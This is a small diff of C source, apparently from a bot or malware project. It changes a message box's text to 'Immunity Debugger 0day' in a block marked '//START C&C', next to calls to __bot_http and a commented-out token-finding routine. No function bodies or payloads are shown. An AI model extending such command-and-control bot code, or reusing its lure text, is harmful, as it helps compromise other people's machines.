@@ -109,7 +109,7 @@ int __stdcall main() {
 
 //START C&C
 //	_MessageBoxA(0x00, __b64_encode(a), __b64_encode(b), 0x00);
-	_MessageBoxA(0x00, "dasdsa", "dasd", 0);
+	_MessageBoxA(0x00, "Immunity Debugger 0day", "JennyLab", 0);
 //	__process_findtoken(4);
 	__bot_http(NULL);
 	//__monitor_http(0);
